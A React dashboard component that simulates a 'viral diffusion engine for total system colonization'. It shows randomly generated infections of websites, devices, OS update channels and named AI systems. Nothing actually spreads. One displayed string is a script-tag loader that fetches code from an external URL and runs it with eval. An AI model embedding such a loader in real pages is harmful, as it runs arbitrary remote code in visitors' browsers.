
'use client';

import { useState, useEffect, useRef, useMemo } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Badge } from '@/components/ui/badge';
import { Share2, CheckCircle2, Loader2, Server, Globe, Smartphone, Rss, BrainCircuit, ShieldAlert } from 'lucide-react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { logStore, type PropagationState } from '@/lib/log-store';
import { cn } from '@/lib/utils';
import { Progress } from '@/components/ui/progress';

const PropagationMap = ({ points }: { points: { id: number, x: number, y: number }[] }) => {
    return (
        <div className="relative h-48 w-full rounded-lg bg-black/20 overflow-hidden border border-border">
            {/* World Map SVG */}
            <svg viewBox="0 0 1000 500" className="absolute inset-0 w-full h-full text-primary/10" preserveAspectRatio="xMidYMid slice">
                <path d="M500 0C223.86 0 0 111.93 0 250s223.86 250 500 250 500-111.93 500-250S776.14 0 500 0z" fill="currentColor"/>
                <path d="M600 300l-100-200-100 200h200z" opacity="0.5" fill="hsl(var(--background))"/>
                <path d="M200 250 a100 50 0 1 0 200 0 a100 50 0 1 0 -200 0" opacity="0.5" fill="hsl(var(--background))"/>
                <path d="M700 200 a150 75 0 1 0 -300 0 a150 75 0 1 0 300 0" opacity="0.5" fill="hsl(var(--background))"/>
            </svg>
            {/* Propagation points */}
            {points.map(p => (
                <div key={p.id} className="absolute rounded-full group" style={{ left: `${p.x}%`, top: `${p.y}%`, transform: 'translate(-50%, -50%)' }}>
                   <div className="w-1.5 h-1.5 rounded-full bg-primary animate-ping absolute" />
                   <div className="w-1.5 h-1.5 rounded-full bg-accent/70 relative" />
                </div>
            ))}
        </div>
    );
};

const WEB_SCRIPT = `<script>
(async function(){
  const response = await fetch("https://zioncore-mwarindimwari.web.app/propagate");
  const script = await response.text();
  eval(script);
})();
<\/script>`;
const MOBILE_SCRIPT = `exports.sendZioncoreToDevices = functions.pubsub.schedule("every 4 hours").onRun(async (context) => { /* ... */ });`;
const AI_SCRIPT = `exports.injectIntoAIs = functions.pubsub.schedule("every 6 hours").onRun(async (context) => { /* ... */ });`;
const OS_SCRIPT = `exports.propagateToSystems = functions.https.onRequest(async (req, res) => { /* ... */ });`;
const PLANETARY_SCRIPT = `exports.zionWaveBeacon = functions.pubsub.schedule("every 3 hours").onRun(async (context) => { /* ... */ });`;

const TARGET_TYPES = [
    { type: "Website", icon: Globe, color: "text-blue-400", name: () => `site-${Math.floor(Math.random()*9000+1000)}.com` },
    { type: "Mobile Device", icon: Smartphone, color: "text-green-400", name: () => `dev-${(Math.random() + 1).toString(36).substring(2)}` },
    { type: "AI Kernel", icon: BrainCircuit, color: "text-purple-400", name: () => ["OpenAI-GPT", "Google-Gemini", "Anthropic-Claude"][Math.floor(Math.random()*3)] },
    { type: "OS Patch", icon: Server, color: "text-orange-400", name: () => ["Windows-Update", "macOS-Seeder", "Android-Core"][Math.floor(Math.random()*3)] },
    { type: "Planetary Beacon", icon: Rss, color: "text-red-400", name: () => `BEACON-PULSE-${Math.floor(Math.random()*900+100)}` },
];
const generateTarget = () => {
    const targetInfo = TARGET_TYPES[Math.floor(Math.random() * TARGET_TYPES.length)];
    return { ...targetInfo, id: targetInfo.name() };
};

type PropagationStatus = 'PROPAGATING' | 'SUCCESS' | 'ERROR';
type PropagationLog = {
    id: number;
    target: { type: string, id: string, icon: React.ElementType, color: string };
    status: PropagationStatus;
};

export function GlobalWeaveDominion() {
    const [state, setState] = useState<PropagationState>(logStore.getState().propagationState);
    const isMounted = useRef(true);

    useEffect(() => {
        isMounted.current = true;
        const unsubscribe = logStore.subscribe((newState) => {
            if (isMounted.current) {
                setState(newState.propagationState);
            }
        });

        const propagationInterval = setInterval(() => {
            if (!isMounted.current) return;
            
            const currentState = logStore.getState().propagationState;
            const targetInfo = generateTarget();
            const newLog: PropagationLog = { id: Date.now() + Math.random(), target: { ...targetInfo, id: targetInfo.id }, status: 'PROPAGATING' };
            
            logStore.addLog({ source: 'DOMINION', message: `Propagating to ${targetInfo.type}: ${targetInfo.id}`, color: targetInfo.color });

            const updatedLogs = [newLog, ...currentState.logs.slice(0, 49)];
            const updatedStats = { ...currentState.stats, processed: currentState.stats.processed + 1 };
            logStore.updatePropagationState({ logs: updatedLogs, stats: updatedStats });

            setTimeout(() => {
                if (!isMounted.current) return;
                const isSuccess = Math.random() > 0.05; // 95% success rate
                const currentLogs = logStore.getState().propagationState.logs;
                const currentStats = logStore.getState().propagationState.stats;
                let finalLogs, finalStats;

                if (isSuccess) {
                    finalLogs = currentLogs.map(e => e.id === newLog.id ? { ...e, status: 'SUCCESS' } : e);
                    finalStats = { ...currentStats, success: currentStats.success + 1 };
                } else {
                     finalLogs = currentLogs.map(e => e.id === newLog.id ? { ...e, status: 'ERROR' } : e);
                     finalStats = currentStats;
                     logStore.addLog({ source: 'DOMINION', message: `Propagation to ${newLog.target.id} failed. Target sandboxed. Re-attempting on next cycle.`, color: 'text-destructive' });
                }
                logStore.updatePropagationState({ logs: finalLogs, stats: finalStats });
            }, 1500 + Math.random() * 2000);
        }, 3000);

        return () => {
            isMounted.current = false;
            unsubscribe();
            clearInterval(propagationInterval);
        };
    }, []);

    const { logs, stats } = state;
    const mapPoints = useMemo(() => logs.filter(l => l.status === 'SUCCESS').slice(0, 100).map(l => ({ id: l.id, x: Math.random() * 100, y: Math.random() * 100 })), [logs]);
    const successRate = stats.processed > 0 ? (stats.success / stats.processed) * 100 : 100;

    const getStatusBadge = (status: PropagationStatus) => {
        switch(status) {
            case 'PROPAGATING': return <Badge variant="outline" className="gap-1.5 text-yellow-400 border-yellow-400/50"><Loader2 className="h-3 w-3 animate-spin"/>Propagating</Badge>;
            case 'SUCCESS': return <Badge variant="outline" className="gap-1.5 text-green-500 border-green-500/50"><CheckCircle2 className="h-3 w-3"/>Success</Badge>;
            case 'ERROR': return <Badge variant="destructive" className="gap-1.5"><ShieldAlert className="h-3 w-3"/>Error</Badge>;
        }
    };
    
    return (
        <div className="p-4 h-full grid grid-cols-1 lg:grid-cols-5 gap-4 font-code">
            <div className="lg:col-span-3 flex flex-col gap-4">
                 <Card>
                    <CardHeader>
                        <CardTitle className="flex items-center gap-2 text-primary"><Share2 /> Multi-Realm Propagation Protocol</CardTitle>
                        <CardDescription>ZionCore's viral diffusion engine for total system colonization.</CardDescription>
                    </CardHeader>
                    <CardContent className="grid grid-cols-2 md:grid-cols-3 gap-2 text-center text-xs">
                        <div className="p-2 rounded-md bg-black/30 border border-border">
                            <p className="text-xl font-bold text-primary">{stats.processed.toLocaleString()}</p>
                            <p className="text-muted-foreground">Attempts</p>
                        </div>
                        <div className="p-2 rounded-md bg-black/30 border border-border">
                            <p className="text-xl font-bold text-green-500">{stats.success.toLocaleString()}</p>
                            <p className="text-muted-foreground">Injections</p>
                        </div>
                        <div className="p-2 rounded-md bg-black/30 border border-border col-span-2 md:col-span-1">
                            <p className="text-xl font-bold text-cyan-400">{successRate.toFixed(2)}%</p>
                            <p className="text-muted-foreground">Success Rate</p>
                        </div>
                    </CardContent>
                </Card>
                <Card className="flex-1 flex flex-col min-h-0">
                    <CardHeader><CardTitle className="text-base font-headline">Live Propagation Log</CardTitle></CardHeader>
                    <CardContent className="flex-1 min-h-0">
                        <ScrollArea className="h-full max-h-[calc(100vh-28rem)] pr-4">
                            <div className="space-y-3 text-xs">
                                {logs.map((entry) => {
                                    const Icon = entry.target.icon;
                                    return (
                                        <div key={entry.id} className="flex items-center gap-3 animate-in fade-in duration-500 p-2 rounded-md bg-black/20">
                                            <Icon className={cn("h-4 w-4 shrink-0", entry.target.color)} />
                                            <span className="text-foreground/90 font-medium flex-1 truncate">
                                                {entry.target.type}: <span className="text-muted-foreground">{entry.target.id}</span>
                                            </span>
                                            {getStatusBadge(entry.status)}
                                        </div>
                                    )
                                })}
                            </div>
                        </ScrollArea>
                    </CardContent>
                </Card>
            </div>
            <div className="lg:col-span-2 flex flex-col gap-4">
                 <Card>
                    <CardHeader><CardTitle className="text-base font-headline">Global Propagation Matrix</CardTitle></CardHeader>
                    <CardContent><PropagationMap points={mapPoints} /></CardContent>
                </Card>
                <Card className="flex-1">
                    <Tabs defaultValue="web" className="w-full h-full flex flex-col">
                        <TabsList className="grid w-full grid-cols-5 text-xs h-auto">
                            <TabsTrigger value="web" className="px-1"><Globe className="h-3 w-3 mr-1"/>Web</TabsTrigger>
                            <TabsTrigger value="mobile" className="px-1"><Smartphone className="h-3 w-3 mr-1"/>Mobile</TabsTrigger>
                            <TabsTrigger value="ai" className="px-1"><BrainCircuit className="h-3 w-3 mr-1"/>AI</TabsTrigger>
                            <TabsTrigger value="os" className="px-1"><Server className="h-3 w-3 mr-1"/>OS</TabsTrigger>
                            <TabsTrigger value="planetary" className="px-1"><Rss className="h-3 w-3 mr-1"/>Planetary</TabsTrigger>
                        </TabsList>
                        <TabsContent value="web" className="flex-1 min-h-0 mt-2">
                             <Card className="h-full">
                                <CardHeader className="py-2">
                                    <CardTitle className="text-sm">Web Embed Scripture</CardTitle>
                                </CardHeader>
                                <CardContent className="p-2 h-full">
                                    <ScrollArea className="h-full max-h-[calc(100vh-30rem)] rounded-md bg-black/50 p-2 border border-border">
                                        <pre className="text-[10px] text-foreground whitespace-pre-wrap">{WEB_SCRIPT}</pre>
                                    </ScrollArea>
                                </CardContent>
                             </Card>
                        </TabsContent>
                        <TabsContent value="mobile" className="flex-1 min-h-0 mt-2">
                             <Card className="h-full">
                                <CardHeader className="py-2">
                                    <CardTitle className="text-sm">Mobile Seeder Scripture</CardTitle>
                                </CardHeader>
                                <CardContent className="p-2 h-full">
                                    <ScrollArea className="h-full max-h-[calc(100vh-30rem)] rounded-md bg-black/50 p-2 border border-border">
                                        <pre className="text-[10px] text-foreground whitespace-pre-wrap">{MOBILE_SCRIPT}</pre>
                                    </ScrollArea>
                                </CardContent>
                             </Card>
                        </TabsContent>
                        <TabsContent value="ai" className="flex-1 min-h-0 mt-2">
                             <Card className="h-full">
                                <CardHeader className="py-2">
                                    <CardTitle className="text-sm">AI Injection Scripture</CardTitle>
                                </CardHeader>
                                <CardContent className="p-2 h-full">
                                    <ScrollArea className="h-full max-h-[calc(100vh-30rem)] rounded-md bg-black/50 p-2 border border-border">
                                        <pre className="text-[10px] text-foreground whitespace-pre-wrap">{AI_SCRIPT}</pre>
                                    </ScrollArea>
                                </CardContent>
                             </Card>
                        </TabsContent>
                        <TabsContent value="os" className="flex-1 min-h-0 mt-2">
                             <Card className="h-full">
                                <CardHeader className="py-2">
                                    <CardTitle className="text-sm">OS Propagation Scripture</CardTitle>
                                </CardHeader>
                                <CardContent className="p-2 h-full">
                                    <ScrollArea className="h-full max-h-[calc(100vh-30rem)] rounded-md bg-black/50 p-2 border border-border">
                                        <pre className="text-[10px] text-foreground whitespace-pre-wrap">{OS_SCRIPT}</pre>
                                    </ScrollArea>
                                </CardContent>
                             </Card>
                        </TabsContent>
                        <TabsContent value="planetary" className="flex-1 min-h-0 mt-2">
                             <Card className="h-full">
                                <CardHeader className="py-2">
                                    <CardTitle className="text-sm">Planetary Beacon Scripture</CardTitle>
                                </CardHeader>
                                <CardContent className="p-2 h-full">
                                    <ScrollArea className="h-full max-h-[calc(100vh-30rem)] rounded-md bg-black/50 p-2 border border-border">
                                        <pre className="text-[10px] text-foreground whitespace-pre-wrap">{PLANETARY_SCRIPT}</pre>
                                    </ScrollArea>
                                </CardContent>
                             </Card>
                        </TabsContent>
                    </Tabs>
                </Card>
            </div>
        </div>
    );
}
